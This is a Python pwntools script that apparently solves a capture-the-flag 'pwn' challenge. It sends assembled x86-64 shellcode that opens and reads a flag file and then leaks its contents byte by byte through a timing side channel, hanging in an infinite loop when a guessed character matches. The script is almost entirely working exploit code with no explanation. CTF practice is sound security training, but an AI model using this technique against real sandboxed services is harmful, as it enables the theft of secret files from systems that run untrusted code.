from pwn import *
import string
import os
#context.log_level="debug"

#r=remote("pwn.sixstars.team","23604")
#r=process("./chall_4")

sh = """
    call here
    .ascii "./flag"
    .byte 0
here:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x02
    syscall

    mov rdi, 0x3
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0x00
    syscall

    mov ebx, %d
    xor rcx, rcx
    mov cl, byte ptr[rsp+%d]
    xor ecx, ebx 
loop:
    jne loop 
"""
#print sh[273:274]
#print sh[226:230]
#newsh=sh[:226]+x+sh[230:]
x=""
vec=[]
for i in range(10):
    vec.append(ord(str(i)))
for i in ['a','b','c','d','e','f','}']:
    vec.append(ord(i))
for j in range(5,40):
    for i in vec:
        #newsh=sh[:226]+ord(i)+sh[230:]
        newsh=sh%(i,j)
        r=remote("pwn.sixstars.team","23604")
        #r=process("./chall_4")
        shellcode = asm(newsh,arch="amd64")
        r.recv()
        r.sendline(shellcode)
        try:
            r.recvline(timeout=1)
        except:
            x=x+chr(i)
            print x
            r.close()
            break
    if(i==ord("}")):
        break
print x 
#r.interactive()
